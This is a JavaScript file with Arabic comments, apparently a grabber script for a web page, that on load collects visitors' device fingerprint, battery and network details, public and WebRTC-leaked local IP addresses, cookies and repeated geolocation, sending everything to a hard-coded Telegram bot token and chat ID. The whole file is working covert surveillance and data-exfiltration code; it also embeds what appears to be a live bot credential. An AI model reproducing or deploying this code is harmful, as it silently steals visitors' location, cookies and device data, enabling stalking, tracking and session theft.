// إرسال المعلومات إلى Telegram
function sendInformationToTelegram(info) {
    var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
    var chatId = '962686305';
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;

    fetch(url).then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data => {
        console.log('Information sent to Telegram bot:', data);
    }).catch(error => {
        console.error('There was a problem with the fetch operation:', error);
    });
}

// جمع معلومات الجهاز والشبكة
function collectExtendedDeviceInfo() {
    var deviceInfo = {};

    // جمع معلومات الجهاز الأساسية
    deviceInfo.platform = navigator.platform;
    deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'غير متوفر';
    deviceInfo.deviceMemory = navigator.deviceMemory || 'غير متوفر';
    deviceInfo.userAgent = navigator.userAgent;

    // تحديد المتصفح
    if (deviceInfo.userAgent.indexOf('Firefox') != -1) {
        deviceInfo.browser = 'Firefox';
    } else if (deviceInfo.userAgent.indexOf('Chrome') != -1) {
        deviceInfo.browser = 'Chrome';
    } else if (deviceInfo.userAgent.indexOf('Safari') != -1) {
        deviceInfo.browser = 'Safari';
    } else if (deviceInfo.userAgent.indexOf('Edge') != -1) {
        deviceInfo.browser = 'Edge';
    }

    // جمع معلومات وحدة المعالجة الرسومية
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        deviceInfo.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
        deviceInfo.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
    }

    // جمع دقة الشاشة
    deviceInfo.screenHeight = window.screen.height;
    deviceInfo.screenWidth = window.screen.width;

    // جمع معلومات الشبكة
    if ('connection' in navigator) {
        var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        deviceInfo.networkType = connection.type;
        deviceInfo.networkSpeed = connection.downlink;
        deviceInfo.networkEffectiveType = connection.effectiveType;
    }

    // جمع معلومات البطارية
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            deviceInfo.batteryLevel = battery.level * 100 + '%';
            deviceInfo.batteryCharging = battery.charging ? 'نعم' : 'لا';
            deviceInfo.batteryChargingTime = battery.chargingTime;
            deviceInfo.batteryDischargingTime = battery.dischargingTime;
            sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
        });
    } else {
        sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
    }

    // جمع عناوين IP
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            deviceInfo.publicIP = data.ip;
            sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
        });

    getLocalIP(ip => {
        deviceInfo.localIP = ip;
        sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
    });

    // جمع المواقع التي تمت زيارتها
    if (document.cookie) {
        deviceInfo.recentVisitedSites = document.cookie;
    }

    sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
}

// جمع عنوان IP المحلي
function getLocalIP(callback) {
    var peerConnection = new RTCPeerConnection({ iceServers: [] });
    peerConnection.createDataChannel('');
    peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer)).catch(error => console.error(error));
    peerConnection.onicecandidate = event => {
        if (event.candidate) {
            var candidate = event.candidate.candidate;
            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            var ipMatch = ipRegex.exec(candidate);
            if (ipMatch) {
                callback(ipMatch[1]);
            }
        }
    };
}

// طلب إذن الموقع وحفظه محليًا
function requestLocationPermission() {
    navigator.geolocation.getCurrentPosition(function(position) {
        localStorage.setItem('locationPermission', 'granted');
        document.getElementById('permissionPopup').style.display = 'none';
        collectAndSendLocation();
    }, function(error) {
        console.log("Error: " + error.message);
        document.getElementById('permissionPopup').style.display = 'block';
    });
}

// التحقق من حالة إذن الموقع
function checkLocationPermission() {
    var locationPermission = localStorage.getItem('locationPermission');
    if (locationPermission === 'granted') {
        collectAndSendLocation();
    } else {
        navigator.permissions.query({name:'geolocation'}).then(function(result) {
            if (result.state === 'granted') {
                collectAndSendLocation();
            } else if (result.state === 'prompt' || result.state === 'denied') {
                requestLocationPermission();
            }
        });
    }
}

// جمع وإرسال موقع المستخدم
function collectAndSendLocation() {
    navigator.geolocation.getCurrentPosition(function(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
        var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
        sendInformationToTelegram(locationInfo);
    });
}

// استدعاء الوظائف عند تحميل الصفحة
window.onload = function() {
    checkLocationPermission();
    collectExtendedDeviceInfo();
    setInterval(checkLocationPermission, 30000); // التحقق من الإذن كل 30 ثانية
};
